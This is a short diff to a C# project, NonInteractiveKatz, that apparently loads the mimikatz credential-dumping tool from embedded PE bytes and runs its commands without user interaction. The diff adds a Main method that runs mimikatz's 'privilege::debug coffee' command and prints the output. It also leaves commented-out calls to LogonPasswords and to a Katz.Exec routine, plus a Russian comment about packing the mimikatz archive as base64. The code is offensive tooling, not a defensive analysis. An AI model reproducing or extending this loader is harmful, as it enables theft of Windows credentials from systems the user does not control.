@@ -14,6 +14,15 @@ namespace NonInteractiveKatz
 {
     public class NonInteractiveKatz
     {
+        public static void Main()
+        {
+            //KatzAssembly.Program.Main(); //- создаст b64 из архива mimikatz
+
+            Console.WriteLine(NonInteractiveKatz.Coffee());
+            //Console.WriteLine(NonInteractiveKatz.LogonPasswords());
+            //KatzAssembly.Katz.Exec(false);
+            //Console.ReadLine();
+        }
 
         private static byte[] PEBytes32 { get; set; }
         private static byte[] PEBytes64 { get; set; }
@@ -113,7 +122,9 @@ namespace NonInteractiveKatz
 
         public static string Coffee()
         {
-            return Command("privilege::debug coffee");
+            string s = Command("privilege::debug coffee");
+            Console.WriteLine(s);
+            return s;
         }
 
         /// <summary>
